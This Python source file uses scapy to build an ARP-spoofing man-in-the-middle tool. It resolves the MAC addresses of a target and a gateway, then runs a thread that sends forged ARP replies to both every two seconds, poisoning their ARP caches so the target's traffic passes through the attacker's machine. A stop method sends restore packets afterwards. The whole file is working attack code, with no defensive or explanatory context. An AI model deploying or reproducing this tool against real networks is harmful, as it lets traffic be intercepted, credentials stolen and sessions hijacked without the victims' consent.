from scapy.all import ARP, Ether, sendp, send, srp

import time
import threading


#Some color stuffs
white = '\033[1;97m'
green = '\033[1;32m'
blue = '\033[94m'
red = '\033[1;31m'
yellow = '\033[1;33m'
magenta = '\033[1;35m'
end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m'
que =  '\033[1;34m[?]\033[1;m'
bad = '\033[1;31m[-]\033[1;m'
good = '\033[1;32m[+]\033[1;m'
run = '\033[1;97m[~]\033[1;m'


def get_mac(ip):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, inter = 0.1)
    for snd,rcv in ans:
            return rcv.sprintf(r"%Ether.src%")
    return None


class Mitm(threading.Thread):
    def __init__(self, target_ip, gateway_ip):
        threading.Thread.__init__(self)
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.broadcast = "ff:ff:ff:ff:ff:ff"
        self.target_mac = get_mac(target_ip)
        self.gateway_mac = get_mac(gateway_ip)
        self.mode=2
        self.attack = True

    def check_init(self):
        if self.gateway_mac==None:
            print(bad+"Unable to find the MAC address of Gateway")
            return False
        elif self.target_mac==None:
            print(bad+"Unable to find the MAC address of Target")
            return False
        return True

    def restore_arp(self):
        # used layer 3 send() here
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip), count=5)
        print(good+"ARP Restore packets sent.")

    def run(self):
        # used Layer 2 sendp() here
        while self.attack:
            sendp(Ether(dst=self.target_mac)/ARP(op=self.mode, psrc = self.gateway_ip, pdst = self.target_ip))
            sendp(Ether(dst=self.gateway_mac)/ARP(op=self.mode, psrc = self.target_ip, pdst = self.gateway_ip))
            time.sleep(2)
        
    def stop(self):
        self.attack = False
        self.restore_arp()
    